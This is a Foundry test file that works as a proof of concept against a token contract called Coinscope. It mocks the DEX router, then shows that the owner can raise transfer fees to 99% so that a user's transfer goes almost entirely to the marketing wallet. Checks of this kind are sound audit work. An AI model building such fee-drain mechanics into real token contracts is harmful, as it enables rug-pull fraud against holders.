// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Coinscope.sol";

contract CoinscopeTest is Test {
    Coinscope token;
    address owner = address(this);
    address marketingWallet = address(0xFEE);
    address user = address(0x1);
    address recipient1 = address(0x2);
    address recipient2 = address(0x3);
    
    function setUp() public {
        // Mock router and factory to avoid token constructor errors
        address routerAddr = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address mockFactory = address(0xFAC70123);
        address mockWeth = address(0xDEAD);

        // Mock router functions
        bytes4 factorySig = bytes4(keccak256("factory()"));
        vm.mockCall(routerAddr, abi.encodeWithSelector(factorySig), abi.encode(mockFactory));

        bytes4 wethSig = bytes4(keccak256("WETH()"));
        vm.mockCall(routerAddr, abi.encodeWithSelector(wethSig), abi.encode(mockWeth));

        // Mock factory createPair function
        bytes4 createPairSig = bytes4(keccak256("createPair(address,address)"));
        vm.mockCall(mockFactory, abi.encodeWithSelector(createPairSig), abi.encode(address(0x1)));

        // Deploy token contract
        token = new Coinscope();
        
        // Set marketing wallet and disable swapping
        token.setMarketingWallet(payable(marketingWallet));
        token.setSwapAndLiquifyEnabled(false);
        token.setNumTokensSellToAddToLiquidity(1 ether);
        
        // Transfer tokens to user
        token.transfer(user, 1000 ether);
    }

    function testOwnerCanDrainTokensThroughFees() public {
        console.log("===== DIFFERENTIAL STATE VALIDATION =====");
        console.log("[PRE-ATTACK FEE STATE (NORMAL 5% fee)]");
        // Verify normal fee behavior (5% marketing + 5% liquidity = 10% total)
        token.setMarketingLiquifyFeePercent(5);
        token.setLiquidityFeePercent(5);
        
        // Pre-transfer state
        uint256 marketingTokenBefore = token.balanceOf(marketingWallet);
        uint256 recipientBalanceBefore = token.balanceOf(recipient1);
        uint256 userTokenBefore = token.balanceOf(user);
        
        console.log("Marketing token Before:    ", marketingTokenBefore);
        console.log("Recipient Token Before:    ", recipientBalanceBefore);
        console.log("User Token Before:         ", userTokenBefore);
        
        console.log("\n--- Execute Normal Transfer (100 ether) ---");
        // Execute transfer with normal fee (10%)
        vm.prank(user);
        token.transfer(recipient1, 100 ether);
        
        // Post-transfer state
        uint256 marketingTokenAfter = token.balanceOf(marketingWallet);
        uint256 recipientBalanceAfter = token.balanceOf(recipient1);
        uint256 feeToMarketingNormal = marketingTokenAfter - marketingTokenBefore;
        uint256 tokensReceived = recipientBalanceAfter - recipientBalanceBefore;
        
        console.log("\n[NORMAL FEE OUTCOMES]");
        console.log("Marketing token Gain:      ", feeToMarketingNormal);
        console.log("Tokens actually received:  ", tokensReceived);
        console.log("Total fee taken:           ", 100 ether - tokensReceived);
        
        console.log("\n[ATTACK CONFIGURATION (99% fee)]");
        // Configure attack parameters - abnormally high fees
        token.setMarketingLiquifyFeePercent(99);
        token.setLiquidityFeePercent(1);
        
        // Pre-attack state
        marketingTokenBefore = token.balanceOf(marketingWallet);
        recipientBalanceBefore = token.balanceOf(recipient2);
        userTokenBefore = token.balanceOf(user);
        
        console.log("Marketing token Before:    ", marketingTokenBefore);
        console.log("Recipient Token Before:    ", recipientBalanceBefore);
        console.log("User Token Before:         ", userTokenBefore);
        
        console.log("\n--- Execute Attack Transfer (100 ether) ---");
        // Execute transfer with manipulated fee (100% total fee)
        vm.prank(user);
        token.transfer(recipient2, 100 ether);
        
        // Post-attack state
        marketingTokenAfter = token.balanceOf(marketingWallet);
        recipientBalanceAfter = token.balanceOf(recipient2);
        uint256 feeToMarketingAttack = marketingTokenAfter - marketingTokenBefore;
        tokensReceived = recipientBalanceAfter - recipientBalanceBefore;
        
        console.log("\n[ATTACK FEE OUTCOMES]");
        console.log("Marketing token Gain:      ", feeToMarketingAttack);
        console.log("Tokens actually received:  ", tokensReceived);
        console.log("Total fee taken:           ", 100 ether - tokensReceived);

        // Differential validation
        console.log("\n===== VULNERABILITY VERIFICATION =====");
        bool marketingFeeIncreased = feeToMarketingAttack > feeToMarketingNormal * 10; // At least 10x increase
        bool vulnerabilityExploited = marketingFeeIncreased && (tokensReceived < 10 ether); // Recipient gets almost nothing
        
        // Final verdict
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Fee parameters allow owner to drain tokens through marketing fees");
        } else {
            console.log("Vulnerability not Exist: Fee manipulation didn't significantly increase marketing fee");
        }
        
        assertTrue(vulnerabilityExploited, "Vulnerability not exploited");
    }
    
    receive() external payable {}
}